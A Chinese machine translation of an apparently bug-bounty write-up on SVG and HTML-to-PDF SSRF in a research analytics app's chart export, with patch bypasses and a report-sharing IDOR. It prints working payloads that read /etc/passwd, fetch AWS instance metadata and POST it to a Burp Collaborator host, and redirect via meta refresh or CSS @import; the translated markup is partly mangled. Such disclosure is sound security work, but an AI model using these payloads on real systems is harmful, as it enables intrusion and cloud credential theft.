<html>
<head>
<title>SVG SSRFs and saga of bypasses</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">SVG SSRFs和旁路传奇</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7?source=collection_archive---------1-----------------------#2022-04-11">https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7?source=collection_archive---------1-----------------------#2022-04-11</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="60e4" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">大家好，希望你们一切都好，保持安全。这个博客是关于我最近使用SVG，HTML到PDF SSRF的经验，以及应用补丁的旁路。</h2></div><h2 id="6989" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">介绍</h2><p id="a918" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">我测试了一个应用程序，这是一个基于网络的分析解决方案，与世界各地的研究机构打交道，分析新的、新兴的研究趋势，并创建报告。</p><p id="3f3d" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">由于应用程序大量处理数据分析，该应用程序具有以饼图、图表、表格等形式显示研究数据的功能。也可以用数据准备报告，并与合作研究人员共享。</p><p id="a984" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">这些饼图、报告和图表可以导出为DOCX、PDF和PNG格式。你看到我要去哪里了吗？</p><h2 id="3bfd" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">剥削</h2><p id="855a" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">正如我们之前了解到的，研究数据是以图表的形式显示的。下面是相同的截图。</p><figure class="md me mf mg gt mh gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mc"><img src="../Images/5f5558c74954e44bfb289e0a900dc7d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MnVqtaw_9TfGPLS1iADNcA.png"/></div></div></figure><p id="1c0c" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">在屏幕截图的右侧，我们看到了<strong class="lg iu"> <em class="mo">“将图表导出为图像”</em> </strong>的选项</p><p id="f782" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">单击“将图表导出为图像”,我们会看到一个POST请求，其中包含图像内容，如下图所示。</p><figure class="md me mf mg gt mh gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mp"><img src="../Images/e940419e2a81681875b411801c980e58.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5QJzVL5TdcFyQd7ms2q3vA.png"/></div></div></figure><p id="754d" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我最初只是删除了整个<code class="fe mq mr ms mt b">content</code>参数，并用</p><blockquote class="mu mv mw"><p id="f690" class="le lf mo lg b lh lx ju lj lk ly jx lm mx lz lo lp my ma lr ls mz mb lu lv lw im bi translated"><h1> h1注射</h1></p></blockquote><p id="de02" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">该图像是一个PNG图像，在用“h1”标记替换内容后，服务器没有任何验证/输出编码，我可以看到h1标记被成功注入。这个我截图不多。</p><p id="069a" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">由于HTMLi工作正常，我注意到许多<code class="fe mq mr ms mt b">svg</code>标签被发送。我只是使用下面的有效载荷来检索<code class="fe mq mr ms mt b">etc/passwd</code>的内容。</p><pre class="md me mf mg gt na mt nb nc aw nd bi"><span id="dafb" class="ki kj it mt b gy ne nf l ng nh">&lt;svg width="500" height="500"  ae ni" href="http://www.w3.org/2000/svg" rel="noopener ugc nofollow" target="_blank"&gt;http://www.w3.org/2000/svg" xmlns:xlink="<a class="ae ni" href="http://www.w3.org/1999/xlink" rel="noopener ugc nofollow" target="_blank">http://www.w3.org/1999/xlink</a>"&gt;</span><span id="04c9" class="ki kj it mt b gy nj nf l ng nh">&lt;foreignObject width="500" height="500"&gt;</span><span id="fe2b" class="ki kj it mt b gy nj nf l ng nh">&lt;iframe ae ni" href="http://www.w3.org/1999/xhtml" rel="noopener ugc nofollow" target="_blank"&gt;http://www.w3.org/1999/xhtml" src="file:///etc/passwd" width="800" height="850"/&gt;</span><span id="780c" class="ki kj it mt b gy nj nf l ng nh">&lt;/foreignObject&gt;</span><span id="bd7d" class="ki kj it mt b gy nj nf l ng nh">&lt;/svg&gt;</span></pre><p id="6e9b" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我可以如预期的那样恢复文件内容。</p><h2 id="8587" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">已应用补丁</h2><h2 id="d9b7" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">##旁路-1</h2><p id="4ef8" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">客户对<code class="fe mq mr ms mt b">iframe</code> <code class="fe mq mr ms mt b">script</code>等标签进行了编码。所以获取文件内容不再像以前那么简单了。</p><p id="cffc" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">在这里，我想介绍一个伟大的资源开发SVG SSRF。</p><div class="nk nl gp gr nm nn"><a href="https://github.com/allanlw/svg-cheatsheet" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd iu gy z fp ns fr fs nt fu fw is bi translated">GitHub - allanlw/SVG-cheatsheet:一个利用服务器端SVG处理器的cheatsheet。</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">利用服务器端SVG处理器的说明书。- GitHub - allanlw/svg-cheatsheet:一个利用…</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">github.com</p></div></div><div class="nw l"><div class="nx l ny nz oa nw ob mm nn"/></div></div></a></div><p id="766e" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我能够在我的服务器上使用<code class="fe mq mr ms mt b">image</code>标签和其他使用<code class="fe mq mr ms mt b">src</code>属性的标签接收回调。</p><p id="7f08" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">因为javascript (script)标签是不允许的，所以我的想法是想办法运行JS。</p><p id="cda1" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">通过<a class="ae ni" href="https://github.com/allanlw/svg-cheatsheet" rel="noopener ugc nofollow" target="_blank">https://github.com/allanlw/svg-cheatsheet</a>我了解到“<strong class="lg iu">inline in event JavaScript</strong>”可以运行。</p><p id="c63f" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我在<a class="ae ni" href="https://github.com/allanlw/svg-cheatsheet#inline-in-event" rel="noopener ugc nofollow" target="_blank">https://github.com/allanlw/svg-cheatsheet#inline-in-event</a>使用了有效载荷，内联JS确实工作了。</p><p id="f922" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">现在我需要一种方法来提取数据。我构建了下面的有效载荷</p><pre class="md me mf mg gt na mt nb nc aw nd bi"><span id="78d0" class="ki kj it mt b gy ne nf l ng nh">&lt;svg width="100%" height="100%" viewBox="0 0 100 100" </span><span id="2a9a" class="ki kj it mt b gy nj nf l ng nh">ae ni" href="http://www.w3.org/2000/svg" rel="noopener ugc nofollow" target="_blank"&gt;http://www.w3.org/2000/svg" xmlns:xlink="<a class="ae ni" href="http://www.w3.org/1999/xlink" rel="noopener ugc nofollow" target="_blank">http://www.w3.org/1999/xlink</a>"&gt;</span><span id="64c5" class="ki kj it mt b gy nj nf l ng nh">&lt;image xlink:href="<a class="ae ni" href="https://google.com/favicon.ico" rel="noopener ugc nofollow" target="_blank">https://google.com/favicon.ico</a>" height="20" width="20" onload="fetch('<a class="ae ni" href="http://169.254.169.254/latest/meta-data/hostname').then(function" rel="noopener ugc nofollow" target="_blank">http://169.254.169.254/latest/meta-data/hostname').then(function</a> (response) {</span><span id="5e48" class="ki kj it mt b gy nj nf l ng nh">response.text().then(function(text) {</span><span id="e198" class="ki kj it mt b gy nj nf l ng nh">var params = text;</span><span id="5328" class="ki kj it mt b gy nj nf l ng nh">var http = new XMLHttpRequest();</span><span id="88a7" class="ki kj it mt b gy nj nf l ng nh">var url = 'https://&lt;&gt;.burpcollaborator.net/';</span><span id="3829" class="ki kj it mt b gy nj nf l ng nh">http.open('POST', url, true);</span><span id="d267" class="ki kj it mt b gy nj nf l ng nh">http.send(params);</span><span id="8942" class="ki kj it mt b gy nj nf l ng nh">})});" /&gt;</span><span id="a3a7" class="ki kj it mt b gy nj nf l ng nh">&lt;/svg&gt;</span></pre><h2 id="478f" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">有效载荷是如何工作的？</h2><ol class=""><li id="a8ae" class="oc od it lg b lh li lk ll kr oe kv of kz og lw oh oi oj ok bi translated">我们加载Google的favicon，加载成功后，事件处理程序<strong class="lg iu"> <em class="mo"> onload </em> </strong>被触发。</li><li id="6b60" class="oc od it lg b lh ol lk om kr on kv oo kz op lw oh oi oj ok bi translated">使用Fetch API，我们请求AWS元数据。</li><li id="6af6" class="oc od it lg b lh ol lk om kr on kv oo kz op lw oh oi oj ok bi translated">我们将元数据响应存储在“params”参数中。</li><li id="0bae" class="oc od it lg b lh ol lk om kr on kv oo kz op lw oh oi oj ok bi translated">然后，服务器向burp collaborator服务器发出POST请求，将元数据作为POST主体。证据见所附图片。</li></ol><figure class="md me mf mg gt mh gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi oq"><img src="../Images/93fd4445cb6fd723e0ef68da0297e3d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sx_1yTJ9LEE2JLC06Tge5w.png"/></div></div></figure><h2 id="2c00" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">##旁路-2</h2><p id="86bb" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">客户现在已经实现了阻止javascript的修复。此外，如果你记得有输出编码应用于标签，如<code class="fe mq mr ms mt b">script</code> <code class="fe mq mr ms mt b">iframe</code>等。</p><p id="c6db" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">然后我读了这个有趣的旁路——<a class="ae ni" href="https://twitter.com/kunalp94/status/1502527605836173312" rel="noopener ugc nofollow" target="_blank">https://twitter.com/kunalp94/status/1502527605836173312</a></p><p id="b1a9" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我使用了同样的<code class="fe mq mr ms mt b">meta</code>标签，结果很成功。分享下面的有效载荷</p><pre class="md me mf mg gt na mt nb nc aw nd bi"><span id="b9aa" class="ki kj it mt b gy ne nf l ng nh">&lt;meta http-equiv="refresh" content="0;url=http://169.254.169.254" /&gt;</span></pre><h2 id="e551" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">##旁路-3</h2><p id="8156" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">客户应用了更多的输出编码。我当时别无选择，然后想起了纳哈姆西的伟大演讲。下面的视频</p><figure class="md me mf mg gt mh"><div class="bz fp l di"><div class="or os l"/></div></figure><p id="b60b" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">在这里，Ben谈到了在<code class="fe mq mr ms mt b">style</code>标签(CSS)处的缺失验证。我也试过。</p><p id="7775" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我尝试了<code class="fe mq mr ms mt b">style</code>、<code class="fe mq mr ms mt b">import</code>、<code class="fe mq mr ms mt b">link</code>标签。我成功地得到了复试机会。</p><p id="5147" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我使用了下面的有效载荷(HTML在<code class="fe mq mr ms mt b">style</code>标签中),它工作了！！</p><pre class="md me mf mg gt na mt nb nc aw nd bi"><span id="ab92" class="ki kj it mt b gy ne nf l ng nh">&lt;style&gt;&lt;h1&gt;h1taginjection&lt;/h1&gt;&lt;iframe ae ni" href="http://www.w3.org/1999/xhtml" rel="noopener ugc nofollow" target="_blank"&gt;http://www.w3.org/1999/xhtml" src="file:///etc/passwd" width="800" height="850"/&gt;<br/>    <a class="ae ni" href="http://twitter.com/import" rel="noopener ugc nofollow" target="_blank">@import</a> url(<a class="ae ni" href="http://ta79rlzq77p2kdoak91nqryxlorff4.burpcollaborator.net/import.css" rel="noopener ugc nofollow" target="_blank">http://ta79rlzq77p2kdoak91nqryxlorff4.burpcollaborator.net/import.css</a>);</span><span id="7b1d" class="ki kj it mt b gy nj nf l ng nh">&lt;/style&gt;</span></pre><h2 id="5255" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">##最终修复</h2><p id="b3cb" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">在又一个补丁和更多的编码之后，我尝试了各种标签，但没有成功。</p><h2 id="63e8" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">向SSRF DOCX报告</h2><p id="ad84" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">与上述攻击类似,“导出到DOCX的报告”也容易受到攻击。</p><h2 id="ae23" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">我擅长分享报告</h2><p id="17d6" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">此外，还存在一个简单的bug，报告可以与合作研究人员共享。有通过电子邮件邀请用户的功能，还可以设置权限，如仅查看和编辑。</p><p id="7dde" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">该请求包含数字形式的<code class="fe mq mr ms mt b">reportID</code>和<code class="fe mq mr ms mt b">permission</code>、<code class="fe mq mr ms mt b">email</code>。</p><p id="f6f6" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">我更改了<code class="fe mq mr ms mt b">reportID</code>，并能够邀请我参加其他研究人员的报告。</p><p id="3845" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">这个博客到此为止。</p><p id="9624" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">希望你能从这个博客中获得一些新的东西。</p><p id="6d22" class="pw-post-body-paragraph le lf it lg b lh lx ju lj lk ly jx lm kr lz lo lp kv ma lr ls kz mb lu lv lw im bi translated">普瑞瑟姆。</p></div></div>    
</body>
</html>